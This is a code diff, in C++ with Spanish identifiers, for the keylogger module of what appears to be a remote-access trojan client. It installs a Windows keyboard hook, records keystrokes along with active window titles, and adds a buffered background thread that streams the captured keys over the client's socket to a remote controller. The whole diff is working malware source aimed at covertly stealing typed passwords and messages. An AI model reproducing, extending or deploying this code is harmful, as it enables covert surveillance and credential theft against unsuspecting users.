@@ -5,7 +5,33 @@
 extern Cliente* cCliente;
 
 HHOOK kHook = nullptr;
+std::mutex mtx_buffer;
+std::vector<char> cBuffer;
 bool g_Run = false;
+
+void Add_Data(const std::string strData) {
+    std::unique_lock<std::mutex> lock(mtx_buffer);
+    for (char c : strData) {
+        cBuffer.push_back(c);
+    }
+}
+
+void Clear_Data(int iPosStop) {
+    std::unique_lock<std::mutex> lock(mtx_buffer);
+    if (iPosStop > 0 && iPosStop <= cBuffer.size()) {
+        cBuffer.erase(cBuffer.begin(), cBuffer.begin() + iPosStop);
+    }
+}
+
+std::string Get_Data() {
+    std::unique_lock<std::mutex> lock(mtx_buffer);
+    std::string strData = "";
+    if (cBuffer.size() > 0) {
+        cBuffer.push_back('\0');
+        strData = cBuffer.data();
+    }
+    return strData;
+}
 
 
 std::string GetActiveWindow_Title() {
@@ -363,7 +389,7 @@ LRESULT CALLBACK Keyboard_Proc(int nCode, WPARAM wparam, LPARAM lparam) {
             strTempBuffer += "]";
         }
         strTempBuffer += c_KeyMap((unsigned int)kbs->vkCode);
-        cCliente->cChunkSend(cCliente->sckSocket, strTempBuffer.c_str(), strTempBuffer.size(), 0, true, nullptr, EnumComandos::KL_Salida);
+        Add_Data(strTempBuffer);
     }
     else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP) {
         DWORD key = kbs->vkCode;
@@ -374,8 +400,7 @@ LRESULT CALLBACK Keyboard_Proc(int nCode, WPARAM wparam, LPARAM lparam) {
             key == VK_RWIN) {
 
             strTempBuffer += Add_Terminator(c_KeyMap((int)kbs->vkCode));
-
-            cCliente->cChunkSend(cCliente->sckSocket, strTempBuffer.c_str(), strTempBuffer.size(), 0, true, nullptr, EnumComandos::KL_Salida);
+            Add_Data(strTempBuffer);
         }
 
     }
@@ -392,6 +417,7 @@ void mod_Keylogger::Start() {
 	this->isRunning = true;
     g_Run = true;
 	this->thKey = std::thread(&mod_Keylogger::CaptureKeys, this);
+    this->thSend = std::thread(&mod_Keylogger::SendThread, this);
 }
 
 void mod_Keylogger::Stop() {
@@ -402,9 +428,12 @@ void mod_Keylogger::Stop() {
     lock.unlock();
 
     
-    DebugPrint("[!] Joining thread");
+    DebugPrint("[!] Joining threads");
     if (this->thKey.joinable()) {
         this->thKey.join();
+    }
+    if (this->thSend.joinable()) {
+        this->thSend.join();
     }
 
     DebugPrint("[!] Keylogger stopped");
@@ -421,4 +450,23 @@ void mod_Keylogger::CaptureKeys() {
 	}
 }
 
+void mod_Keylogger::SendThread() {
+    while (1) {
+        {
+            std::unique_lock<std::mutex> lock(this->mtx_Run);
+            if (!this->isRunning) {
+                break;
+            }
+        }
+
+        std::string strData = Get_Data();
+        int iData_Size = strData.size();
+        if (iData_Size > 0) {
+            cCliente->cChunkSend(cCliente->sckSocket, strData.c_str(), iData_Size, 0, true, nullptr, EnumComandos::KL_Salida);
+            Clear_Data(iData_Size+1); // +1 por el byte nulo \0
+        }
+        
+        std::this_thread::sleep_for(std::chrono::milliseconds(100));
+    }
+}
 
